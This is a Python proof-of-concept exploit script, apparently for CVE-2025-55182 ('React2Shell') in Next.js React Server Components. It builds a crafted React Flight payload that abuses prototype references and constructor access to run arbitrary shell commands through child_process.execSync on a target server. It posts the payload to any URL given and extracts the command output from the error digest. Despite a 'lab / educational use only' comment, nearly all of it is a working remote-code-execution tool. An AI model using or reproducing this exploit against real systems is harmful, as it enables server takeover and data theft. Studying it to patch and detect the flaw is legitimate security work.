#!/usr/bin/env python3
# poc.py
# Author: krakhen.dev
# Url	: https://vciso.cloud
# Purpose: React2Shell PoC for CVE-2025-55182 (Next.js / React Server Components)
# Notes:
#   - Sends a crafted React Flight payload to trigger RCE via Server Actions.
#   - Extracts command output from the NEXT_REDIRECT digest when successful.
#   - For lab / educational use only.
# Version 1.2.2
import argparse
import requests
import urllib3
import sys
import json
from pathlib import Path

# Disable SSL warnings (use --insecure for HTTPS labs)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Colors
GREEN  = "\033[92m"
RED    = "\033[91m"
CYAN   = "\033[96m"
YELLOW = "\033[93m"
RESET  = "\033[0m"


def build_payload(executable: str) -> dict:
    """Build crafted chunk structure for React Flight exploitation."""
    # Very small sanity escape for single quotes inside the command
    safe_exec = executable.replace("'", "\\'")
    crafted_chunk = {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then": "$B0"}',
        "_response": {
            # Throws NEXT_REDIRECT with the command output inside `digest`
            "_prefix": (
                "var res = process.mainModule.require('child_process').execSync('" 
                + safe_exec + 
                "',{'timeout':5000}).toString().trim(); " 
                "throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});"
            ),
            # If you don't need the command output, this could be simplified to just execSync(...)
            "_formData": {
                "get": "$1:constructor:constructor",
            },
        },
    }

    files = {
        "0": (None, json.dumps(crafted_chunk)),
        "1": (None, '"$@0"'),
    }

    return files


def extract_digest(body: str):
    """Best-effort extraction of the `digest` field from the server error body."""
    key = '"digest":"'
    idx = body.find(key)
    if idx == -1:
        return None
    start = idx + len(key)
    end = body.find('"', start)
    if end == -1:
        return None
    return body[start:end]


def main():
    parser = argparse.ArgumentParser(
        description="React2Shell PoC for CVE-2025-55182 (Next.js / React Server Components)",
        epilog=(
            "Examples:\n"
            "  python3 poc.py -u http://localhost:3000 -c 'id'\n"
            "  python3 poc.py -u https://target.com -c 'whoami' --insecure\n"
            "  python3 poc.py -u http://10.0.0.5:3000 -c 'uname -a' -o result.txt\n"
        ),
        formatter_class=argparse.RawTextHelpFormatter,
    )

    parser.add_argument(
        "-u", "--url", required=True,
        help="Base URL of the vulnerable Next.js app (e.g. http://localhost:3000)",
    )
    parser.add_argument(
        "-c", "--cmd", default="id",
        help="Command to execute on the target (default: id)",
    )
    parser.add_argument(
        "-T", "--timeout", type=int, default=10,
        help="HTTP timeout in seconds (default: 10)",
    )
    parser.add_argument(
        "-k", "--insecure", action="store_true",
        help="Disable TLS verification (useful for HTTPS labs)",
    )
    parser.add_argument(
        "-o", "--output",
        help="Optional output file to store raw HTTP response (txt)",
    )

    args = parser.parse_args()

    base_url = args.url.strip()
    verify_tls = not args.insecure

    print(f"{CYAN}React2Shell PoC - CVE-2025-55182{RESET}")
    print(f"{CYAN}---------------------------------{RESET}\n")
    print(f"{CYAN}[+] Target URL :{RESET} {base_url}")
    print(f"{CYAN}[+] Command    :{RESET} {args.cmd}\n")

    files = build_payload(args.cmd)
    headers = {"Next-Action": "x"}

    print(f"{CYAN}[+] Sending crafted Flight payload...{RESET}")

    try:
        res = requests.post(
            base_url,
            files=files,
            headers=headers,
            timeout=args.timeout,
            verify=verify_tls,
        )
    except Exception as e:
        print(f"{RED}[X] Request failed:{RESET} {e}")
        sys.exit(1)

    print(f"{CYAN}[+] HTTP status:{RESET} {res.status_code}\n")

    body = res.text

    # Try to extract digest (command output)
    digest = extract_digest(body)
    if digest:
        print(f"{GREEN}[✓] RCE confirmed. Command output:{RESET}\n")
        print(f"    {digest}\n")
    else:
        print(f"{YELLOW}[!] No digest field found in response body.{RESET}")
        print(f"{YELLOW}[!] Raw body (truncated to 800 chars):{RESET}\n")
        print(body[:800] + ("..." if len(body) > 800 else ""))

    # Optional output file
    if args.output:
        out_path = Path(args.output)
        try:
            with open(out_path, "w", encoding="utf-8") as f:
                f.write(f"URL: {base_url}\n")
                f.write(f"Command: {args.cmd}\n")
                f.write(f"Status: {res.status_code}\n\n")
                f.write(body)
            print(f"\n{GREEN}[✓] Raw response saved to:{RESET} {out_path}")
        except Exception as e:
            print(f"{RED}[X] Failed to write output file:{RESET} {e}")


if __name__ == "__main__":
    main()
